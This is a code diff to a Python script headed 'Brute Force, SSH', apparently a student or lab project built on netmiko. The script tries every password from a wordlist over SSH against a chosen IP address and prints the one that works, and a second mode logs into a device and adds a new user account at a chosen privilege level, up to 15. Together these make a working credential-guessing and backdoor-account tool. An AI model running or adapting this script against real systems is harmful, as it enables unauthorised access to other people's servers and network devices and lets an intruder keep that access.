@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 # Nick Alderete & Andrew Perry
-# Brute Force, SSHfrom netmiko import ConnectHandler# Get user input
+# Brute Force, SSH
 
 
 
@@ -13,13 +13,16 @@ from netmiko import ConnectHandler
 
 # Establish SSH connection
 def mode1():
+    # User input
     ip_address = input("Enter the IP address: ")
     password_file = input("Enter the file path for the password file: ")
     username = input("Enter the username: ")
+
     # Read passwords from the file
     with open(password_file, 'r') as file:
         passwords = file.readlines()
     passwords = [password.strip() for password in passwords]
+
     # SSH connection parameters
     device = {
         'device_type': 'linux',
@@ -28,14 +31,16 @@ def mode1():
         'password': '',
         'port': 22,
     }
+
     # Establish SSH connection for each password
     for password in passwords:
         device['password'] = password
         try:
             connection = ConnectHandler(**device)
+            connection.enable
             print(f"SSH connection successful with password: {password}")
-            # Perform actions on the Linux server using the connection
-            # For example, execute commands: connection.send_command('command')
+            
+            # Disconnect SSH session
             connection.disconnect()
             break  # Exit the loop if successful connection is established
         except Exception as e:
@@ -54,30 +59,44 @@ def mode2():
         'ip': host,
         'username': username,
         'password': password,
+        'secret': password,
     }
 
     try:
         net_connect = ConnectHandler(**device)
+        net_connect.enable()
+        
+        # Verify SSH connection
         print("Connected successfully!")
     except Exception as e:
         print("Failed to connect:", str(e))
         exit(1)
+
+
     # For adding a new user
     new_username = input("Enter the new username: ")
     new_password = input("Enter the new password: ")
-    command = f"useradd {new_username}"
+    new_privilege = input("Enter the new privilege level (15 for highest): ")
+    
+
+    # Configure new user
+    command = [
+        f'username {new_username} password {new_password} privilege {new_privilege}',
+        'end',
+    ]
 
     try:
-        output = net_connect.send_command(command)
+        output = net_connect.send_config_set(command)
+
         print("User created successfully!")
     except Exception as e:
         print("Failed to create user:", str(e))
 
-    net_connect.disconnect()
+    #net_connect.disconnect()
 
 # User menu     
 while True:
-    print("~ Options ~")
+    print("~Options~")
     print("1. Create an SSH connection.")
     print("2. Create a user at a destination.")
     print("3. Exit")
